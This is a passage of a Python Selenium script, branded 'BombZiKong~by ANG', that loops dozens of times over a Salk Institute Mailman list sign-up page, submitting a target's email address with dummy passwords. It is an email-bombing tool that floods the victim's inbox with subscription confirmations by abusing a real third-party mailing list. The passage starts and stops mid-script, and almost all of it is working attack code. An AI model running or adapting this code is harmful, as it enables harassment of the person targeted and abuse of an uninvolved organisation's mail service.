pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
